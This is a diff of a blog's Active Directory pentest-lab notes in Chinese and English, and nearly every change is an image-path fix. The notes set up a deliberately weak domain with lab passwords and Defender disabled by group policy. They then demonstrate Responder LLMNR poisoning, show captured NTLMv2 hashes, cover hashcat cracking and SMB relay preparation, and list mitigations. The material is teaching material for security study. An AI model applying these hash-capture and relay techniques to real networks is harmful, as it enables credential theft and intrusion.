 <h3 id="Set-up-certificate-services"><a href="#Set-up-certificate-services" class="headerlink" title="Set up certificate services"></a>Set up certificate services</h3><ul>
 <li>used to verify identities in a domain controller &gt; enhanced security</li>
@@ -886,26 +886,26 @@
 <li>want to add security or basic feature, make sure you’re implementing certificate services</li>
 </ul>
 <p>Server manager &gt; Manage &gt; Add Roles and Features &gt; next &gt; next &gt; 打勾Active Directory Certificate Services </p>
-<p><img src="img/ADLAB_Untitled_10.png" alt="Untitled"></p>
-<p><img src="img/ADLAB_Untitled_11.png" alt="Untitled"></p>
+<p><img src="/img/ADLAB_Untitled_10.png" alt="Untitled"></p>
+<p><img src="/img/ADLAB_Untitled_11.png" alt="Untitled"></p>
 <p>next&gt;next&gt;next&gt;打勾 Restart the destination server automatically &gt; Install </p>
 <p>下載完後進入設定</p>
-<p><img src="img/ADLAB_Untitled_12.png" alt="Untitled"></p>
+<p><img src="/img/ADLAB_Untitled_12.png" alt="Untitled"></p>
 <p>next &gt; check Certification Authority &gt; next&gt;next&gt;next&gt;next&gt;next&gt; change 99 year&gt;next&gt;configure </p>
 <p>then reboot server </p>
-<p><img src="img/ADLAB_Untitled_13.png" alt="Untitled"></p>
-<p><img src="img/ADLAB_Untitled_14.png" alt="Untitled"></p>
-<p><img src="img/ADLAB_Untitled_15.png" alt="Untitled"></p>
+<p><img src="/img/ADLAB_Untitled_13.png" alt="Untitled"></p>
+<p><img src="/img/ADLAB_Untitled_14.png" alt="Untitled"></p>
+<p><img src="/img/ADLAB_Untitled_15.png" alt="Untitled"></p>
 <h3 id="Windows-10-setting-User-Machines-2"><a href="#Windows-10-setting-User-Machines-2" class="headerlink" title="Windows 10 setting- User Machines *2"></a>Windows 10 setting- User Machines *2</h3><p>在設定vm時記得要修改成Enterprise</p>
-<p><img src="img/ADLAB_Untitled_16.png" alt="Untitled"></p>
-<p><img src="img/ADLAB_Untitled_17.png" alt="Untitled"></p>
+<p><img src="/img/ADLAB_Untitled_16.png" alt="Untitled"></p>
+<p><img src="/img/ADLAB_Untitled_17.png" alt="Untitled"></p>
 <p>兩台的vm設置相同，跟前面server的安裝過程一樣</p>
 <p>選擇Domain join instead </p>
 <p>陸續輸入帳號密碼，密碼一率都輸入Akali@</p>
-<p><img src="img/ADLAB_Untitled_18.png" alt="Untitled"></p>
+<p><img src="/img/ADLAB_Untitled_18.png" alt="Untitled"></p>
 <p>取消勾選所有選項</p>
-<p><img src="img/ADLAB_Untitled_19.png" alt="Untitled"></p>
-<p><img src="img/ADLAB_Untitled_20.png" alt="Untitled"></p>
+<p><img src="/img/ADLAB_Untitled_19.png" alt="Untitled"></p>
+<p><img src="/img/ADLAB_Untitled_20.png" alt="Untitled"></p>
 <p>下載vm tool &gt; 設定主機名稱</p>
 <p>重開機</p>
 <hr>
@@ -915,12 +915,12 @@
 <li>stores all of users and computers</li>
 <li>here can see different OU</li>
 </ul>
-<p><img src="img/ADLAB_Untitled_21.png" alt="Untitled"></p>
-<p><img src="img/ADLAB_Untitled_22.png" alt="Untitled"></p>
+<p><img src="/img/ADLAB_Untitled_21.png" alt="Untitled"></p>
+<p><img src="/img/ADLAB_Untitled_22.png" alt="Untitled"></p>
 <ul>
 <li>see the computer that are joined to the domain</li>
 <li><p>see what users exist</p>
-<p>  <img src="img/ADLAB_Untitled_23.png" alt="Untitled"></p>
+<p>  <img src="/img/ADLAB_Untitled_23.png" alt="Untitled"></p>
 <ul>
 <li>enterprise admins</li>
 <li>domain admins</li>
@@ -935,15 +935,15 @@
 <li><p>separate these out</p>
 </li>
 </ul>
-<p><img src="img/ADLAB_Untitled_24.png" alt="Untitled"></p>
-<p><img src="img/ADLAB_Untitled_25.png" alt="Untitled"></p>
+<p><img src="/img/ADLAB_Untitled_24.png" alt="Untitled"></p>
+<p><img src="/img/ADLAB_Untitled_25.png" alt="Untitled"></p>
 <ul>
 <li>move that into groups &gt; click Don’t show this…</li>
 </ul>
-<p><img src="img/ADLAB_Untitled_26.png" alt="Untitled"></p>
-<p><img src="img/ADLAB_Untitled_27.png" alt="Untitled"></p>
+<p><img src="/img/ADLAB_Untitled_26.png" alt="Untitled"></p>
+<p><img src="/img/ADLAB_Untitled_27.png" alt="Untitled"></p>
 <p>So the only account that we have to login into domain </p>
-<p><img src="img/ADLAB_Untitled_28.png" alt="Untitled"></p>
+<p><img src="/img/ADLAB_Untitled_28.png" alt="Untitled"></p>
 <ul>
 <li>creat other administrator<ul>
 <li>copy that administrator</li>
@@ -952,45 +952,45 @@
 </ul>
 </li>
 </ul>
-<p><img src="img/ADLAB_Untitled_29.png" alt="Untitled"></p>
-<p><img src="img/ADLAB_Untitled_30.png" alt="Untitled"></p>
+<p><img src="/img/ADLAB_Untitled_29.png" alt="Untitled"></p>
+<p><img src="/img/ADLAB_Untitled_30.png" alt="Untitled"></p>
 <p>copy後填入用戶訊息 &gt; tstark &gt; passwd &gt; Akali@@</p>
-<p><img src="img/ADLAB_Untitled_31.png" alt="Untitled"></p>
-<p><img src="img/ADLAB_Untitled_32.png" alt="Untitled"></p>
+<p><img src="/img/ADLAB_Untitled_31.png" alt="Untitled"></p>
+<p><img src="/img/ADLAB_Untitled_32.png" alt="Untitled"></p>
 <p>Create a service and account that is a domain administrator</p>
 <ul>
 <li>SQLService &gt; password &gt; MYpassword123#</li>
 <li>run as domain admin</li>
 <li>名字間不要有空格</li>
 </ul>
-<p><img src="img/ADLAB_Untitled_33.png" alt="Untitled"></p>
-<p><img src="img/ADLAB_Untitled_34.png" alt="Untitled"></p>
+<p><img src="/img/ADLAB_Untitled_33.png" alt="Untitled"></p>
+<p><img src="/img/ADLAB_Untitled_34.png" alt="Untitled"></p>
 <p>很多管理員會在Description留下機敏資訊，這邊模擬他們的行為</p>
-<p><img src="img/ADLAB_Untitled_35.png" alt="Untitled"></p>
+<p><img src="/img/ADLAB_Untitled_35.png" alt="Untitled"></p>
 <p>再創兩個低權限用戶在domain user group</p>
-<p><img src="img/ADLAB_Untitled_36.png" alt="Untitled"></p>
+<p><img src="/img/ADLAB_Untitled_36.png" alt="Untitled"></p>
 <ul>
 <li>fcastle &gt; Password1</li>
 </ul>
-<p><img src="img/ADLAB_Untitled_37.png" alt="Untitled"></p>
-<p><img src="img/ADLAB_Untitled_38.png" alt="Untitled"></p>
+<p><img src="/img/ADLAB_Untitled_37.png" alt="Untitled"></p>
+<p><img src="/img/ADLAB_Untitled_38.png" alt="Untitled"></p>
 <p>從前面可以看到許多不安全設定</p>
 <p>複製Frank用戶設定</p>
-<p><img src="img/ADLAB_Untitled_39.png" alt="Untitled"></p>
-<p><img src="img/ADLAB_Untitled_40.png" alt="Untitled"></p>
-<p><img src="img/ADLAB_Untitled_41.png" alt="Untitled"></p>
+<p><img src="/img/ADLAB_Untitled_39.png" alt="Untitled"></p>
+<p><img src="/img/ADLAB_Untitled_40.png" alt="Untitled"></p>
+<p><img src="/img/ADLAB_Untitled_41.png" alt="Untitled"></p>
 <p>全部設定完長這樣</p>
-<p><img src="img/ADLAB_Untitled_42.png" alt="Untitled"></p>
+<p><img src="/img/ADLAB_Untitled_42.png" alt="Untitled"></p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">WinServer -&gt;</span><br><span class="line">DC name -  HYDRA-DC</span><br><span class="line">Forest - MARVEL.<span class="built_in">local</span></span><br><span class="line"></span><br><span class="line">useradd -&gt;</span><br><span class="line">+ admin -&gt;</span><br><span class="line">	+ Tony Stark -&gt;</span><br><span class="line">		+ logon name - tstark</span><br><span class="line">		+ passwd - Akali@@</span><br><span class="line">	+ SQLService -&gt;</span><br><span class="line">		+ logon name - SQLService</span><br><span class="line">		+ passwd -&gt; MYpassword123#</span><br><span class="line">		+ description leak the passwd</span><br><span class="line"></span><br><span class="line">+ user -&gt;</span><br><span class="line">	+ Frank Castle - &gt;</span><br><span class="line">		+ logon name - fcastle</span><br><span class="line">		+ passwd - Password1</span><br><span class="line">	+ Peter Parker -&gt;</span><br><span class="line">		+ logon name - pparker</span><br><span class="line">		+ passwd - Akali@@</span><br></pre></td></tr></table></figure>
 <p>Create a file share &gt; abuse later on</p>
 <ul>
 <li>File and Storage Services &gt;Share &gt; New Share &gt; next &gt; next</li>
 </ul>
-<p><img src="img/ADLAB_Untitled_43.png" alt="Untitled"></p>
-<p><img src="img/ADLAB_Untitled_44.png" alt="Untitled"></p>
+<p><img src="/img/ADLAB_Untitled_43.png" alt="Untitled"></p>
+<p><img src="/img/ADLAB_Untitled_44.png" alt="Untitled"></p>
 <p>have a remote path for us of Hydro DC hackme &gt; next&gt;next&gt;create</p>
-<p><img src="img/ADLAB_Untitled_45.png" alt="Untitled"></p>
-<p><img src="img/ADLAB_Untitled_46.png" alt="Untitled"></p>
+<p><img src="/img/ADLAB_Untitled_45.png" alt="Untitled"></p>
+<p><img src="/img/ADLAB_Untitled_46.png" alt="Untitled"></p>
 <p>Setup the service account fully that we had before</p>
 <p>開啟CMD並用管理員身分運行</p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Microsoft Windows [Version 10.0.20348.587]</span><br><span class="line">(c) Microsoft Corporation. All rights reserved.</span><br><span class="line"></span><br><span class="line">C:\Users\Administrator&gt;**setspn -a HYDRA-DC/SQLService.MARVEL.<span class="built_in">local</span>:60111 MARVEL\SQLService</span><br><span class="line">Checking domain DC=MARVEL,DC=<span class="built_in">local</span></span><br><span class="line"></span><br><span class="line">Registering ServicePrincipalNames <span class="keyword">for</span> CN=SQL Service,CN=Users,DC=MARVEL,DC=<span class="built_in">local</span></span><br><span class="line">        HYDRA-DC/SQLService.MARVEL.<span class="built_in">local</span>:60111</span><br><span class="line">Updated object**</span><br></pre></td></tr></table></figure>
@@ -1018,34 +1018,34 @@
 <li>搜索框搜尋Group</li>
 <li>Specifically create GPOs for specific groups or users &gt; do it for whole domain</li>
 </ul>
-<p><img src="img/ADLAB_Untitled_47.png" alt="Untitled"></p>
-<p><img src="img/ADLAB_Untitled_48.png" alt="Untitled"></p>
+<p><img src="/img/ADLAB_Untitled_47.png" alt="Untitled"></p>
+<p><img src="/img/ADLAB_Untitled_48.png" alt="Untitled"></p>
 <p>going to disable Windows Defender in this environment &gt; attacker can run all attacks</p>
 <ul>
 <li>where is antivirus going to get picked up if run an attack</li>
 </ul>
-<p><img src="img/ADLAB_Untitled_49.png" alt="Untitled"></p>
+<p><img src="/img/ADLAB_Untitled_49.png" alt="Untitled"></p>
 <p>找到Microsoft Defender Antivirus &gt; Turn off Microsoft Defender Antivirus</p>
 <ul>
 <li>再更早版本的winser含2019 &gt; Windows Defender Antivirus</li>
 </ul>
-<p><img src="img/ADLAB_Untitled_50.png" alt="Untitled"></p>
-<p><img src="img/ADLAB_Untitled_51.png" alt="Untitled"></p>
-<p><img src="img/ADLAB_Untitled_52.png" alt="Untitled"></p>
+<p><img src="/img/ADLAB_Untitled_50.png" alt="Untitled"></p>
+<p><img src="/img/ADLAB_Untitled_51.png" alt="Untitled"></p>
+<p><img src="/img/ADLAB_Untitled_52.png" alt="Untitled"></p>
 <p>回到GPO設定 &gt; Disable Windows Defender &gt; Enforced</p>
 <ul>
 <li>anytime that user joins the domain or a computer joins the domain, it’s going to get this policy</li>
 <li>or when the policy updates on that computer, If it’s already domain joined, it will get this policy as will</li>
 <li>So this will disable defender once we join the domain with our computers</li>
 </ul>
-<p><img src="img/ADLAB_Untitled_53.png" alt="Untitled"></p>
-<p><img src="img/ADLAB_Untitled_54.png" alt="Untitled"></p>
+<p><img src="/img/ADLAB_Untitled_53.png" alt="Untitled"></p>
+<p><img src="/img/ADLAB_Untitled_54.png" alt="Untitled"></p>
 <p>Make sure this machine have IP address</p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">C:\Users\Administrator&gt;ipconfig</span><br><span class="line"></span><br><span class="line">Windows IP Configuration</span><br><span class="line"></span><br><span class="line">Ethernet adapter Ethernet0:</span><br><span class="line"></span><br><span class="line">   Connection-specific DNS Suffix  . : localdomain</span><br><span class="line">   Link-<span class="built_in">local</span> IPv6 Address . . . . . : fe80::6da1:be85:db3e:51ea%6</span><br><span class="line">   IPv4 Address. . . . . . . . . . . : 192.168.19.148</span><br><span class="line">   Subnet Mask . . . . . . . . . . . : 255.255.255.0</span><br><span class="line">   Default Gateway . . . . . . . . . : 192.168.19.2</span><br></pre></td></tr></table></figure>
 <p>或是手動設置IP地址</p>
-<p><img src="img/ADLAB_Untitled_55.png" alt="Untitled"></p>
+<p><img src="/img/ADLAB_Untitled_55.png" alt="Untitled"></p>
 <p>這台機器不需要聯網，所以設置靜態IP給他</p>
-<p><img src="img/ADLAB_Untitled_56.png" alt="Untitled"></p>
+<p><img src="/img/ADLAB_Untitled_56.png" alt="Untitled"></p>
 <h2 id="Joining-Our-Machines-to-the-Domain"><a href="#Joining-Our-Machines-to-the-Domain" class="headerlink" title="Joining Our Machines to the Domain"></a><strong>Joining Our Machines to the Domain</strong></h2><p>兩台win10都要設定</p>
 <p>Join these machines to the domain </p>
 <ul>
@@ -1053,55 +1053,55 @@
 <li>utilize the accounts that we have for this machine</li>
 <li>change the DNS, because need to point this directly at our domain controller</li>
 </ul>
-<p><img src="img/ADLAB_Untitled_57.png" alt="Untitled"></p>
-<p><img src="img/ADLAB_Untitled_58.png" alt="Untitled"></p>
+<p><img src="/img/ADLAB_Untitled_57.png" alt="Untitled"></p>
+<p><img src="/img/ADLAB_Untitled_58.png" alt="Untitled"></p>
 <h3 id="Join-the-domain"><a href="#Join-the-domain" class="headerlink" title="Join the domain"></a>Join the domain</h3><ul>
 <li>搜索框打domain &gt; Access work or school &gt;Connect &gt; Join this device to a local Active..</li>
 </ul>
-<p><img src="img/ADLAB_Untitled_59.png" alt="Untitled"></p>
-<p><img src="img/ADLAB_Untitled_60.png" alt="Untitled"></p>
+<p><img src="/img/ADLAB_Untitled_59.png" alt="Untitled"></p>
+<p><img src="/img/ADLAB_Untitled_60.png" alt="Untitled"></p>
 <p>輸入帳號密碼登入</p>
 <ul>
 <li>username - administrator</li>
 <li>passwd - Akali@</li>
 </ul>
-<p><img src="img/ADLAB_Untitled_61.png" alt="Untitled"></p>
-<p><img src="img/ADLAB_Untitled_62.png" alt="Untitled"></p>
+<p><img src="/img/ADLAB_Untitled_61.png" alt="Untitled"></p>
+<p><img src="/img/ADLAB_Untitled_62.png" alt="Untitled"></p>
 <p>back to winser &gt; make sure that actually did join these machines</p>
-<p><img src="img/ADLAB_Untitled_63.png" alt="Untitled"></p>
-<p><img src="img/ADLAB_Untitled_64.png" alt="Untitled"></p>
+<p><img src="/img/ADLAB_Untitled_63.png" alt="Untitled"></p>
+<p><img src="/img/ADLAB_Untitled_64.png" alt="Untitled"></p>
 <p>兩台win10重登後登入網域下的帳戶，設置相同</p>
 <p>並找到 locla users and groups &gt; users &gt; Administrator &gt; Set Password &gt; Proceed &gt; 輸入密碼</p>
-<p><img src="img/ADLAB_Untitled_65.png" alt="Untitled"></p>
-<p><img src="img/ADLAB_Untitled_66.png" alt="Untitled"></p>
-<p><img src="img/ADLAB_Untitled_67.png" alt="Untitled"></p>
+<p><img src="/img/ADLAB_Untitled_65.png" alt="Untitled"></p>
+<p><img src="/img/ADLAB_Untitled_66.png" alt="Untitled"></p>
+<p><img src="/img/ADLAB_Untitled_67.png" alt="Untitled"></p>
 <p>雙擊Administrator - uncheck Account is disable</p>
-<p><img src="img/ADLAB_Untitled_68.png" alt="Untitled"></p>
+<p><img src="/img/ADLAB_Untitled_68.png" alt="Untitled"></p>
 <p>Look at the administrators on this computer，並且新增Frank Castle用戶</p>
 <ul>
 <li>Group &gt; Administrators &gt;Add &gt; Frank Castle</li>
 </ul>
 <p>THEPUNISHER-2 &gt; Group - Add Frank Castle</p>
 <p>SPIDERMAN-2 &gt; Group - Add Peter Parker、Frank Castle</p>
-<p><img src="img/ADLAB_Untitled_69.png" alt="Untitled"></p>
-<p><img src="img/ADLAB_Untitled_70.png" alt="Untitled"></p>
-<p><img src="img/ADLAB_Untitled_71.png" alt="THEPUNISHER-2"></p>
+<p><img src="/img/ADLAB_Untitled_69.png" alt="Untitled"></p>
+<p><img src="/img/ADLAB_Untitled_70.png" alt="Untitled"></p>
+<p><img src="/img/ADLAB_Untitled_71.png" alt="THEPUNISHER-2"></p>
 <p>THEPUNISHER-2</p>
-<p><img src="img/ADLAB_Untitled_72.png" alt="SPIDERMAN-2"></p>
+<p><img src="/img/ADLAB_Untitled_72.png" alt="SPIDERMAN-2"></p>
 <p>SPIDERMAN-2</p>
 <p>到檔案管理員 &gt; 網路 &gt; 關閉錯誤訊息 &gt; Turn on network discovery and file sharing</p>
 <p>點入HYDRA-DC文件能查看到共享文件內容</p>
-<p><img src="img/ADLAB_Untitled_73.png" alt="Untitled"></p>
-<p><img src="img/ADLAB_Untitled_74.png" alt="Untitled"></p>
-<p><img src="img/ADLAB_Untitled_75.png" alt="Untitled"></p>
+<p><img src="/img/ADLAB_Untitled_73.png" alt="Untitled"></p>
+<p><img src="/img/ADLAB_Untitled_74.png" alt="Untitled"></p>
+<p><img src="/img/ADLAB_Untitled_75.png" alt="Untitled"></p>
 <p>登出當前管理員帳號，登入一般使用者嘗試</p>
 <ul>
 <li>logon name - .\peterparker</li>
 <li>passwd - Akail@</li>
 </ul>
 <p>文件 &gt; This PC &gt; Computer &gt; Map network..&gt;填入文件位置 <code>\\HYDRA-DC\hackme</code> &gt; 打勾Connect using different credentials &gt; 輸入administrator/Akali@</p>
-<p><img src="img/ADLAB_Untitled_76.png" alt="Untitled"></p>
-<p><img src="img/ADLAB_Untitled_77.png" alt="Untitled"></p>
+<p><img src="/img/ADLAB_Untitled_76.png" alt="Untitled"></p>
+<p><img src="/img/ADLAB_Untitled_77.png" alt="Untitled"></p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">WinServer -&gt;</span><br><span class="line">DC name -  HYDRA-DC</span><br><span class="line">Forest - MARVEL.<span class="built_in">local</span></span><br><span class="line">GPO(Group Policy Management) - Disable Windows Defender</span><br><span class="line">IP - 192.168.19.140</span><br><span class="line"></span><br><span class="line">win10 -&gt;</span><br><span class="line">user -&gt; </span><br><span class="line">+ frankcastle/Akali@@</span><br><span class="line">	+ IP - 192.168.19.149</span><br><span class="line">+ peterparker/Akali@@</span><br><span class="line">	+ IP - 192.168.19.150</span><br><span class="line"></span><br><span class="line">useradd -&gt;</span><br><span class="line">+ admin -&gt;</span><br><span class="line">	+ Tony Stark -&gt;</span><br><span class="line">		+ logon name - tstark</span><br><span class="line">		+ passwd - Akali@@</span><br><span class="line">	+ SQL Service -&gt;</span><br><span class="line">		+ logon name - SQL Service</span><br><span class="line">		+ passwd -&gt; MYpassword123#</span><br><span class="line">		+ description leak the passwd</span><br><span class="line"></span><br><span class="line">+ user -&gt;</span><br><span class="line">	+ Frank Castle - &gt;</span><br><span class="line">		+ logon name - fcastle</span><br><span class="line">		+ passwd - Password1</span><br><span class="line">	+ Peter Parker -&gt;</span><br><span class="line">		+ logon name - pparker</span><br><span class="line">		+ passwd - Password1</span><br></pre></td></tr></table></figure>
       
     </div>
@@ -1172,8 +1172,8 @@
 <li>它將請求廣播到連接到本地網路的每個系統</li>
 <li>如果本地網路上有任何受感染的機器，預設情況下它也會收到主機查詢請求，並且受感染的機器也可以將回應傳送到受害機器。反過來，詢問受害者的密碼雜湊值</li>
 </ul>
-<p><img src="img/ADInitial_Untitled.png" alt="Untitled"></p>
-<p><img src="img/ADInitial_Untitled_1.png" alt="Untitled"></p>
+<p><img src="/img/ADInitial_Untitled.png" alt="Untitled"></p>
+<p><img src="/img/ADInitial_Untitled_1.png" alt="Untitled"></p>
 <h3 id="Run-Responder"><a href="#Run-Responder" class="headerlink" title="Run Responder"></a>Run Responder</h3><p><a target="_blank" rel="noopener" href="https://www.kali.org/tools/responder/">https://www.kali.org/tools/responder/</a></p>
 <ul>
 <li>基本協議 鏈路本地多播名稱解析 <code>LLMNR</code>、名稱伺服器 <code>NBNS</code>、協議和多播 <code>MDNS</code> - Windows 默認開啟<ul>
@@ -1210,12 +1210,12 @@
 <li>passwd - Akali@@</li>
 </ul>
 <p>when we get loggin here, going to explore and navigate to attacker IP address</p>
-<p><img src="img/ADInitial_Untitled_2.png" alt="Untitled"></p>
+<p><img src="/img/ADInitial_Untitled_2.png" alt="Untitled"></p>
 <p>輸入後kali的responder會captured hashes - NTLMv2 hash</p>
 <ul>
 <li>can see what IP address came from</li>
 </ul>
-<p><img src="img/ADInitial_Untitled_3.png" alt="Untitled"></p>
+<p><img src="/img/ADInitial_Untitled_3.png" alt="Untitled"></p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">....</span><br><span class="line">[PROXY] Returning unmodified HTTP response</span><br><span class="line">[SMB] NTLMv2-SSP Client   : **192.168.19.149**</span><br><span class="line">[SMB] NTLMv2-SSP Username : MARVEL\fcastle</span><br><span class="line">[SMB] NTLMv2-SSP Hash     : **fcastle::MARVEL:1c279671420f45c3:DEDDBB842C3D7AD7F911F8345A97C415:010100000000000000DA75D2C162DA015F83122A885FB6290000000002000800420044003700490001001E00570049004E002D004800550056004200370059005000430054004F00460004003400570049004E002D004800550056004200370059005000430054004F0046002E0042004400370049002E004C004F00430041004C000300140042004400370049002E004C004F00430041004C000500140042004400370049002E004C004F00430041004C000700080000DA75D2C162DA0106000400020000000800300030000000000000000100000000200000436D69EED3EB5B35E7DC93EEFEF7628B4ED7CF218E8932D5B2B957767139D9F90A001000000000000000000000000000000000000900260063006900660073002F003100390032002E003100360038002E00310039002E003100330030000000000000000000**                                                                                                                                        </span><br><span class="line">[SMB] NTLMv2-SSP Client   : 192.168.19.149</span><br><span class="line">[SMB] NTLMv2-SSP Username : MARVEL\fcastle</span><br><span class="line">[SMB] NTLMv2-SSP Hash     : fcastle::MARVEL:0fb699ba875964a8:2C4B513447026AB49B757D8A4E41B1D3:010100000000000000DA75D2C162DA01DB87411B07EA9AE30000000002000800420044003700490001001E00570049004E002D004800550056004200370059005000430054004F00460004003400570049004E002D004800550056004200370059005000430054004F0046002E0042004400370049002E004C004F00430041004C000300140042004400370049002E004C004F00430041004C000500140042004400370049002E004C004F00430041004C000700080000DA75D2C162DA0106000400020000000800300030000000000000000100000000200000436D69EED3EB5B35E7DC93EEFEF7628B4ED7CF218E8932D5B2B957767139D9F90A001000000000000000000000000000000000000900260063006900660073002F003100390032002E003100360038002E00310039002E003100330030000000000000000000                                                                                                                                        </span><br><span class="line">[SMB] NTLMv2-SSP Client   : 192.168.19.149</span><br><span class="line">[SMB] NTLMv2-SSP Username : MARVEL\fcastle</span><br><span class="line">[SMB] NTLMv2-SSP Hash     : fcastle::MARVEL:75ac5d61d0467955:3803152E929D39CC9C21EC574086B8C7:010100000000000000DA75D2C162DA010A1F43A5E34B5A780000000002000800420044003700490001001E00570049004E002D004800550056004200370059005000430054004F00460004003400570049004E002D004800550056004200370059005000430054004F0046002E0042004400370049002E004C004F00430041004C000300140042004400370049002E004C004F00430041004C000500140042004400370049002E004C004F00430041004C000700080000DA75D2C162DA0106000400020000000800300030000000000000000100000000200000436D69EED3EB5B35E7DC93EEFEF7628B4ED7CF218E8932D5B2B957767139D9F90A001000000000000000000000000000000000000900260063006900660073002F003100390032002E003100360038002E00310039002E003100330030000000000000000000                                                                                                                                        </span><br><span class="line">[SMB] NTLMv2-SSP Client   : 192.168.19.149</span><br><span class="line">[SMB] NTLMv2-SSP Username : MARVEL\fcastle</span><br><span class="line">[SMB] NTLMv2-SSP Hash     : fcastle::MARVEL:a462b96d5ffe3f59:B045571CC58C7B5B73FA788498602F61:010100000000000000DA75D2C162DA01D7E4E1A6E08A7AB90000000002000800420044003700490001001E00570049004E002D004800550056004200370059005000430054004F00460004003400570049004E002D004800550056004200370059005000430054004F0046002E0042004400370049002E004C004F00430041004C000300140042004400370049002E004C004F00430041004C000500140042004400370049002E004C004F00430041004C000700080000DA75D2C162DA0106000400020000000800300030000000000000000100000000200000436D69EED3EB5B35E7DC93EEFEF7628B4ED7CF218E8932D5B2B957767139D9F90A001000000000000000000000000000000000000900260063006900660073002F003100390032002E003100360038002E00310039002E003100330030000000000000000000</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
 <p>If passwd is weak, we can actually take this hash and crack </p>
 <h3 id="Cracking-Our-Captured-Hashes"><a href="#Cracking-Our-Captured-Hashes" class="headerlink" title="Cracking Our Captured Hashes"></a><strong>Cracking Our Captured Hashes</strong></h3><p>將hash存到檔案中</p>
@@ -1245,7 +1245,7 @@
 <li>最常見的雜湊方式為MD5，如果是要破解此演算法輸入<code>-m 0</code></li>
 <li>要選擇其他雜湊可以 <code>hashcat --help</code> 選擇左側編號</li>
 </ul>
-<p><img src="img/ADInitial_Untitled_4.png" alt="Untitled"></p>
+<p><img src="/img/ADInitial_Untitled_4.png" alt="Untitled"></p>
 <ul>
 <li><code>-a</code>指定哪種爆破模式，0:直接字典破解 1:組合破解 3:暴力破解，</li>
 </ul>
@@ -1262,7 +1262,7 @@
 <ul>
 <li><strong>若要停用 NBT-NS，請導覽至網路連線 &gt; 網路介面卡屬性 &gt; TCP/IPv4 屬性 &gt; 進階選項卡 &gt; WINS 選項卡，然後選擇「停用 TCP/IP 上的 NetBIOS」。這僅適用於本地</strong></li>
 </ul>
-<p><img src="img/ADInitial_Untitled_5.png" alt="Untitled"></p>
+<p><img src="/img/ADInitial_Untitled_5.png" alt="Untitled"></p>
 <p>If a company must use or cannot disable LLMNR/NBT-NS,the best course of action is to:</p>
 <ul>
 <li>Require Network Access Control.<ul>
@@ -1276,15 +1276,15 @@
 </li>
 </ul>
 <p>Policies → Administrative… → Network → DNS Client → turn off multicast → Enable</p>
-<p><img src="img/ADInitial_Untitled_6.png" alt="Untitled"></p>
-<p><img src="img/ADInitial_Untitled_7.png" alt="Untitled"></p>
-<p><img src="img/ADInitial_Untitled_8.png" alt="Untitled"></p>
+<p><img src="/img/ADInitial_Untitled_6.png" alt="Untitled"></p>
+<p><img src="/img/ADInitial_Untitled_7.png" alt="Untitled"></p>
+<p><img src="/img/ADInitial_Untitled_8.png" alt="Untitled"></p>
 <h3 id="確認緩解措施"><a href="#確認緩解措施" class="headerlink" title="確認緩解措施"></a><strong>確認緩解措施</strong></h3><p><strong>我們可以透過在 PowerShell 中執行以下命令並收到「0」返回來確認我們已緩解 LLMNR：</strong></p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">**$(Get-ItemProperty -Path <span class="string">&quot;HKLM:\Software\Policies\Microsoft\Windows NT\DNSClient&quot;</span> -name EnableMulticast).EnableMulticast**</span><br></pre></td></tr></table></figure>
-<p><img src="img/ADInitial_Untitled_9.png" alt="Untitled"></p>
+<p><img src="/img/ADInitial_Untitled_9.png" alt="Untitled"></p>
 <p><strong>我們可以透過在 cmd.exe 中執行以下命令並收到「2」作為回報來確認我們已緩解 NBT-NS：</strong></p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">**wmic nicconfig get caption,index,TcpipNetbiosOptions**</span><br></pre></td></tr></table></figure>
-<p><img src="img/ADInitial_Untitled_10.png" alt="Untitled"></p>
+<p><img src="/img/ADInitial_Untitled_10.png" alt="Untitled"></p>
 <h2 id="SMB-Relay-Attacks-Overview"><a href="#SMB-Relay-Attacks-Overview" class="headerlink" title="SMB Relay Attacks Overview"></a><strong>SMB Relay Attacks Overview</strong></h2><p><a target="_blank" rel="noopener" href="https://tcm-sec.com/smb-relay-attacks-and-how-to-prevent-them/">https://tcm-sec.com/smb-relay-attacks-and-how-to-prevent-them/</a></p>
 <p>伺服器訊息塊(SMB) 用作網路檔案共享協定。它使電腦應用程式能夠讀取、寫入檔案以及請求網路中的伺服器程式服務。</p>
 <p>SMB 在 Windows 環境中廣泛採用，提供對文件和印表機等資源的共用存取。然而，當與NTLM (NT LAN Manager) 驗證配合使用且不安全時，它就會成為中繼攻擊的主要目標。從本質上講，攻擊者操縱了協定對網路使用者的固有信任。</p>
@@ -1318,7 +1318,7 @@
 </ul>
 <h3 id="Identify-Hosts-Without-SMB-Signing"><a href="#Identify-Hosts-Without-SMB-Signing" class="headerlink" title="Identify Hosts Without SMB Signing"></a>Identify Hosts Without SMB Signing</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#腳本會嘗試以訪客使用者身分連接到目標的偵聽 SMB2 服務。然後它將提供有關該服務的資訊</span></span><br><span class="line">**nmap --script smb2-security-mode.nse -p445 &lt;目標ip&gt;**</span><br><span class="line"></span><br><span class="line">訊息簽名可能產生三種結果：</span><br><span class="line"></span><br><span class="line">&gt; 訊息簽名已停用</span><br><span class="line">&gt; 訊息簽名已啟用但不是必需的（SMB2 的預設）</span><br><span class="line">&gt; 已啟用且需要訊息簽名</span><br></pre></td></tr></table></figure>
 <p>在 SMB 中繼攻擊期間，攻擊者會捕獲有效的身份驗證會話，然後中繼它，從而獲得存取權限。攻擊者可以轉發這些雜湊值以進行未經授權的訪問，而不是破解雜湊值。</p>
-<p><img src="img/ADInitial_Untitled_11.png" alt="Untitled"></p>
+<p><img src="/img/ADInitial_Untitled_11.png" alt="Untitled"></p>
 <p>上圖顯示了未強制執行 SMB 簽章的工作站。這是 所有 Windows 工作站的預設設定。</p>
 <p>我們將收集所有未強制執行 SMB 簽章的工作站，並將它們放入名為Targets.txt的檔案中</p>
 <h3 id="make-some-configuration-changes-to-responder"><a href="#make-some-configuration-changes-to-responder" class="headerlink" title="make some configuration changes to responder"></a>make some configuration changes to responder</h3><p>我們將利用 Responder 和 ntlmrelayx 進行攻擊。我們必須先正確配置 Responder 以停用 SMB 和 HTTP 回應，因為這些回應將會轉送到 ntlmrelayx（最終中繼）。</p>
@@ -1326,9 +1326,9 @@
 <ul>
